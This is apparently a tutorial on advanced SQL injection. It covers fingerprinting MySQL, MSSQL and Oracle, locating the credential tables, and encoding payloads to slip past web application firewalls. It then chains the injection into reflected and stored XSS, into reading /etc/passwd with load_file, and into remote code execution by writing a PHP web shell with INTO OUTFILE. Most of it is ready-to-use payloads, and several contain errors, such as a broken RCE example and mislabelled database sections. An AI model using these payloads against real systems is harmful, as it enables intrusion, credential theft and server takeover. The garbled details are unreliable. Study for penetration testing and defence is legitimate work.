# SQLi INJECTION - Medium - Advanced

## TOPICS 

* [Before starting](#Before-starting)
* [Sql injections in different databases](#Sql-injections-in-different-databases)
    * [MySQL](#MySQL)
      * [Default databases](#Default-databases)
      * [Database version](#Database-version)
      * [Default credentials](#Default-credentials)
      * [Current database](#Current-database)
      * [Server Hostname](#Server-Hostname)
    * [MySSQL](#MySSQL)
      * [Default databases](#Default-databases)
      * [Database version](#Database-version)
      * [Default credentials](#Default-credentials)
      * [Current database](#Current-database)
      * [Server Hostname](#Server-Hostname)
    * [Oracle](#Oracle)
      * [Default databases](#Default-databases)
      * [Database version](#Database-version)
      * [Default credentials](#Default-credentials)
      * [Current database](#Current-database)
      * [Server Hostname](#Server-Hostname)
* [Types of payloads](#Types-of-payloads)
   * [Boolean-based blind](#Boolean-based-blind)
   * [Error-based](#Error-based)
   * [Union query-based](#Union-query-based)
   * [Stacked queries](#Stacked-queries)
   * [Time-based blind](#Time-based-blind)
   * [Inline queries](#Inline-queries)
* [Encodings](#Encodings)
   * [Encoding with comments](#Encoding-with-comments)
   * [Url encoding](#Url-encoding)
   * [upper case and lower case](#upper-case-and-lower-case)
   * [Hex encoding](#Hex-encoding)
* [Create encoded payloads](#Create-encoded-payloads)
* [Using sql functions to get information](#Using-sql-functions-to-get-information)
   * [RPAD](#RPAD)
   * [SOUNDS LIKE](#SOUNDS-LIKE)
   * [UPPER](#UPPER)
   * [REVERSE](#REVERSE)
   * [RIGHT](#RIGHT)
   * [ELT](#ELT)
   * [HEX](#HEX)
   * [HUNEX](#HUNEX)
   * [CASE](#CASE)
   * [IF](#IF)
   * [EXTRACTVALUE](#EXTRACTVALUE)
* [Moving from sql Injection to other vulnerabilities](#Moving-from-sql-Injection-to-other-vulnerabilities)
   * [De Sqli a XSS](#De-Sqli-a-XSS)
      * [XSS reflectivo](#XSS-reflectivo)
      * [XSS persistente](#XSS-persistente)  
   * [De Sqli a LFR](#De-Sqli-a-LFR)
   * [De Sqli a RCE](#De-Sqli-a-RCE)
   

## Before starting

This writing is intended as a direct continuation of my previous reading of sqli injections where the bases of this vulnerability are explained in a little more general way, so if you are not aware of it I recommend that you first review it before to begin this reading, since this writing will be a little more advanced.


## sqli injections in different databases

Let's start by clarifying that an sql injection is not the same in all databases, although they may be a bit similar, they are not entirely the same, this is because each database has its own syntax.

To give an example of this I am going to take 3 different databases and try to show the differences separately, the databases that we are going to see are:

```
MySQL
MSSQL
ORACLE
```

The information that we are going to collect will be the following:

```

Default databases.
Know the version of the database.
Databases containing the default credentials.
Know the database in which we are.
Know the hostname of the server.
Tables and columns.
Know the privileges.

```

### MySQL

#### Default databases

```
mysql 
information_schema
```
#### Database version

```
VERSION()
@@VERSION
@@GLOBAL.VERSION
```

#### Default credentials

In this case the MySQL database has by default the credentials in a table called:

```
mysql.user
```

To be more exact in the columns: `user and password`

#### Current database

```
database ()
schema ()
```

#### Server Hostname

```
@@ HOSTNAME
```

### MySSQL

#### Default databases.

```
Model
Msdb
Tempdb
Northwind
Information_schema
```
#### Database version

```
@@VERSION
```

#### Default credentials

In this case the MySSQL database has by default the credentials in 2 tables called:

```
master..syslogins
master..sysprocesses
```

To be more exact in the columns: `name y loginame`

#### Base de datos actual

```
db_name()
```

#### Server Hostname 

```
@@SERVERNAME
SERVERPROPERTY()
```

### Oracle

#### Default databases.

```
System
Sysaux
```
#### Database version

```
VERSION
```

#### Default credentials

In this case the MySQL database has by default the credentials in a table called:

```
all_users
sys.user $
```

To be more exact in the columns:

```
username

name and password
```

#### Current database

```
global_name
yam
instance_name
SYS.DATABASE_NAME
```

#### Server Hostname

```
host_name
UTL_INADDR.get_host_name
```

## Types of payloads

### Boolean-based blind

Boolean-based blind means that the vulnerability is based on Boolean values ​​(true or false) and is said to be blind because it does not show any sign that there is an error on the page.

### Error-based

Error-based means that the injection is based on the error messages that the server responds and thus knows a little more about the structure of the database that is being used.

### Union query-based

Union query-based means that we are taking advantage of the UNION operator from sql can be used, thanks to this we can combine statements that will be displayed as part of the server's response.

### Stacked queries

Stacked queries means that the vulnerability is based on adding more sql queries in series, in this way sending a normal query and at the same time sending the attacker's query, all this only dividing the queries with a ";".

### Time-based blind

Time-based blind is when the vulnerability is time-based, which means that an attacker will send an sql query forcing the database to wait a certain amount of time, if the server response time is the same time as the attacker stated in the sentence, this means that he is vulnerable.

### Inline queries

Inline queries consists of joining one sql query inside another and so on to see if the statement is executed.


## Encodings

One of the most important methods that we have to take into account when testing an sqli injection are the encodings, which will help us so that a payload can be filtered by some wafs.

### Coding with comments

This type of encoding, as its name says, is to use the sql comment syntax, which is the following:

```
/* */

/* Everything that is enclosed here is a comment */

```

Ejemplo:

 `/*!UNION*/ /*!SELECT*/ 1`
 
### Url encoded

URL encoding replaces spaces with a "+" sign, and some characters
ASCII with a “%” sign followed by its hexadecimal equivalent.

```
union select:

u	= %75
n	= %6e
i	= %69
o	= %6f
n	= %6e
space	= %20
s	= %73
e	= %65
l	= %6c
c	= %63
t	= %74
```

Example:

`%55nion %53elect 1`

### Upper case and lower case

We can also use the method of mixing upper and lower case to see if we can evade some filters.

Example:

`UniOn SeLeCt 1`

### Hex encoded

This is based on encoding the comments method we saw earlier in hex code:

`/%2A%2A/ y %2F**%2F`

Ejemplo:

```
/%2A%2A/union/%2A%2A/select/%2A%2A/1

%2F**%2Funion%2F**%2Fselect%2F**%2F1
```
 
## Create encoded payloads

In this part I would like to give an example of how to create an encoded payload.

First we are going to define the payload that we want to encode:

``` 
union select 1,2,3,concat(table_name),5 from information_schema.tables where table_schema = database()

```

In this case we are using the payload without any coding, but we have more ways to declare the payload, this by changing its syntax and adding other things even without coding, for example:

``` 
union all(select 1,2,3,concat(table_name),5) from information_schema.tables where table_schema = database()

```

To start coding we are going to first use the comments method:


``` 
/*!50000union*//**//*!50000all/*(/*!50000select*//**/1,2,3,/*!50000concat*/(table_name),5)/**//*!50000from*//**//*!50000information_schema.tables*//**//*!50000where*//**//*!50000table_schema*/=database()

```

Now we have it encoded with comments, but we can mix encodings, for example with the URL method:

``` 
/*!50000%75%6e%69on*//**//*!50000all/*(/*!50000%73%65%6cect*//**/1,2,3,/*!50000%63oncat*/(table_name),5)/**//*!50000%66rom*//**//*!50000%69nformation_schema.tables*//**//*!50000wh%65re*//**//*!50000table_schema*/=database()

```

In this way we can evade filters and play with different encodings and mixes.


## Using sql functions to get information

The SQL language has built-in functions for doing calculations on the data. Of course, the "Official" use of them, but we are in a script of sql injections so we are going to give them a use for this case.

For this example we will use the following functions:

```
RPAD
SOUNDS LIKE
UPPER
REVERSE
RIGHT
ELT
HEX
HUNEX
CASE
IF
EXTRACTVALUE
```

### RPAD

We are going to start with the RPAD function which returns the expr1 padded on the right with the sequence of characters from expr2 and with n characters in length. This function is useful for formatting the output of a query.

its syntax is `RPAD (str, len [, padstr])`

An example of its use in a sql injection:
 
`SELECT RPAD(table_name,50,'.') from information_schema.tables`

### SOUNDS LIKE 

This function can be used to replace the = symbol

Example:

`SELECT concar(table_name) from information_schema.tables where table_schema sounds like database()`

### UPPER
 
Sintaxis: `UPPER(str)`

Example:

`select upper(table_name)from information_schema.tables`


### REVERSE

Sintaxis: `REVERSE(str)`

Example:

`Select reverse(reverse(table_Name)) from information_schema.tables`

NOTE: double reverse is used so that the information is understandable 

### RIGHT

sintaxis: `RIGHT(str,len)`

Example:

`select right(table_name, 100) from information_schema.tables`

### ELT 

Sintaxis: `ELT(N, str1[, str2, str3,...])`

Example:

`Select elt(1, table_Name) from information_schema.tables`

### HEX

Sintaxis: `HEX(N_or_S)`

Example:

`Select hex( table_Name) from information_schema.tables`

### HUNEX

Sintaxis: `UNHEX(str)`

Example: `Select unhex(hex( table_Name)) from information_schema.tables`

### CASE

Example: `SELECT CASE WHEN (1=1) THEN table_name ELSE false END from information_schema.tables`

### IF

Example: `SELECT if(1=1,table_name,'<h3><font color=blue> Tablas:</h3>') from information_schema.tables`

### EXTRACTVALUE

Sintaxis: `EXTRACTVALUE(xml_frag, xpath_expr)`

Example: `SELECT extractvalue(rand(),concat(0x7e,version(),0x7e,user()))`

With this in mind, we can mix between functions, different types of coding and different syntax in the sql sequences to create increasingly personalized payloads.


## Moving from sql Injection to other vulnerabilities

### From Sqli to XSS

When we have a page vulnerable to sql injection it is also vulnerable to sql injections, which can be from the vulnerable parameter, but in this case we are going to use sql injection to inject xss, this can be in 2 ways:

#### Reflective XSS

In the vulnerable column we are going to inject the xss payload that we want.

"IMPORTANT" we have to move to hex.

For the example we are going to use this payload:

`<script>alert("_Y000!_")</script>`

Now in HEX:

`0x3c7363726970743e616c65727428225f59303030215f22293c2f7363726970743e`

Ejemplo:

`union+select+1,0x3c7363726970743e616c65727428225f59303030215f22293c2f7363726970743e,3+--+`

In this way we are doing a reflective xss

#### XSS persistente

For a persistent xss we need to have write permissions, everything is fine and the vulnerable page gives us permissions we have to do the following:

Using the INTO OUTFILE function we are going to write a file at the root of the page.

Example:

`union+select+1,'<script>alert("_Y000!_")</script>',3+INTO+OUTFILE+'ruta/nombre.html'+--+`

And with that we are going to create an .html file with our persistent XSS.

### De Sqli a LFR

Sql also has a function that allows us to load local files and with that we can read files that normally we should not have access to.

Example: `union all select load_file(‘/etc/passwd’)`

### De Sqli a RCE

Using the same method with which we did a persistent xss we are going to do the following:

We are going to inject php code with which we are going to generate a shell with which we are going to be able to execute commands within the vulnerable server

Code:  `'<?php system($_GET["cmd"]); ?>'`

We are going to inject it using a:

INTO+OUTFILE+'ruta/nombre.php'

Example: 

`union+select+1,'load_file(‘/etc/passwd’)',3+INTO+OUTFILE+'ruta/nombre.php'+--+`

Finally, to use it we go to the following route:

`http://vulnerable.com/nombre.php?=ls`

As you can see, we are using the shell that we inject to execute the commands.

To see it a little more graphically, you can see it from here: https://twitter.com/_Y000_/status/1249877772979384320

------------------------------------------- 


Thank you very much for taking the time! If you have any suggestions, you can gladly tell me! 
